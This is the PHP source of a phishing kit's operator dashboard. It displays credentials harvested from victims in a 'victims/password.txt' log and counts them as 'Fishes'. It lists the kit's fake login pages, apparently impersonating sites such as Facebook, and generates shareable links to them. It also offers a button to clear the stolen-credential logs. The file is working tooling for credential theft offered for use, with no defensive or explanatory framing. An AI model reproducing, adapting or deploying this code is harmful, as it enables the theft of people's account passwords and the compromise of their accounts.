<?php session_start();echo'<meta name="viewport" content="width=device-width, initial-scale=1" />';echo'

<style>body{background-color:black;}
.abc{width:20%}
.hd{width:65%}
button{margin-bottom:5px;color:green;background-color:black;font-size:90%;border:2px solid blue;width:30%;height:60px}
.collapsible{background-color:black;color:#00ffff;width:115px;height:115px;border:3px solid #00ffff;border-radius:0%;text-align:center;font-size:25px}.
active,.collapsible:hover{background-color:red;}.content{padding-top:0px; padding-bottom:0px;text-align:center;background-color:black;display:none;overflow:none;align-items:center;justify-content:center;scrollbar-color:red;}
.form-signin{max-width:100px;padding:10px;margin:0 auto;color:red}.
form-signin{margin-bottom:10px}.form-signin{font-weight:normal}.
form-signin .form-control{position:relative;height:auto;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:10px;font-size:16px}.
form-signin .form-control:focus{z-index:2}.form-signin input[type="email"]{margin-bottom:-1px;border-bottom-right-radius:0;border-bottom-left-radius:0;border-color:red;}
.form-signin input[type="password"]{border-top-left-radius:0;border-top-right-radius:0;border-color:blue;}</style>


';include'user_info.php';if(!empty($_SESSION['username'])==$username or($_POST['username']==$username&&$_POST['password']==$password)){$_SESSION['valid']=true;$_SESSION['timeout']=time();if(isset($_POST['username'])==null){}else{$_SESSION['username']=$_POST['username'];}$filename=".././victims/password.txt";$form="<center>
<iframe id=hello src=".$filename." autocomplete=off style=width:300px;height:265px;overflow:scroll;background-color:#00ffff;></iframe>
</center>";if(file_exists($filename)){$str=file_get_contents($filename);}else{$str=' ';}$num1=substr_count($str,"username=");$num2=substr_count($str,"password=");$num3=(($num1+$num2)/2);echo'<script>function aps(){document.getElementById("hello").contentWindow.location.reload();}</script>';$dir='.././sites';$efg=$_SERVER['REQUEST_URI'];$pat=explode('/',$efg);$cds=$_SERVER['SERVER_NAME'];for($i=0;$i<count($pat)- 2;$i++){$cds.=$pat[$i]."/";}$hgf="http://".$cds."sites/";echo'
<center><a <a href=./advance/index.php><button><b>Settings</b></button></a> <a href=./logout.php><button><b>Logout</b></button></a></center>';echo'<br>
<h1 style=margin-bottom:0;><font color=#00cc00><center><img style=margin-bottom:-5px; src=data:image/gif;base64,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> Greetings </font><font color=blue>'.$_SESSION['username'].'</font> !!!
<br><font color=yellow>Select any HACKING link you want.</font><center></h1><br><br>';echo'<button style=margin-left:40%; onclick=aps() id=collapsible class=collapsible><b>Fishes: '.$num3.'</b></button><div class=content>';if(file_exists($filename)){if($str!=""){echo $form.'<br><form method=POST action=clear_logs.php><input type=hidden name=key value=Thisissecretfiledeletingkey />
<input type=checkbox required><font color="#00ffff">  I am 100% sure to 
<button type=submit style="font-weight:bold;color:red;background-color:black;border:2px solid red;text-align:center;width:150px;height:30px;" >Clear all logs</button></form><br><br>';}else{echo"If victim fished successfully, credientials will be listed here.<br>For Example<br>username=example@gmail.com<br>password=examplepass123<br>from=facebook.php<br><br>//Currently NO username & password found.";}}else{echo "$filename does not exist. It will be created automatically if victim fished.";}echo'</div><script>var coll = document.getElementsByClassName("collapsible");var i;for (i = 0; i < coll.length; i++) {coll[i].addEventListener("click", function() {this.classList.toggle("active");var content = this.nextElementSibling;if (content.style.display === "block") {content.style.display = "none";} else {content.style.display = "block";}});}</script>';if($handle=opendir($dir)){while(false!==($entry=readdir($handle))){$add=ucfirst(str_replace('.php','',$entry));if($entry!='.'&&$entry!='..'&&$entry!='post_database.php'&&$entry!='post_in_file.php'&&$entry!='meta_tags.html'&&$entry!='index.php'&&$entry!='dashboard.php'&&$entry!='logout.php'&&$entry!='phishing_info'&&$entry!='remove branding logo'){echo'
<body><div><center><p style=font-size:large;><font color=red><b>'.$add.'</b></center></p><center>
<textarea style=margin-left:-7px; cols=50 rows=2>'.$hgf.$entry.'</textarea></center></div><center><a href='.$hgf.$entry.' target="_blank"><font color=blue><b>Test this Link:</b></font> <font color=#00ffff><b>'.$hgf.$entry.'</b></font><a/></center>';}}echo'<br><br><br><center><button>Version</button> <button>User</button>  <button class=abc>By</button><br><button><b>20.03</b></button> <button><b>'.$_SESSION['username'].'</b></button></a></center>';closedir($handle);}}else{echo'<script>window.location.replace("./index.php");</script>';}?>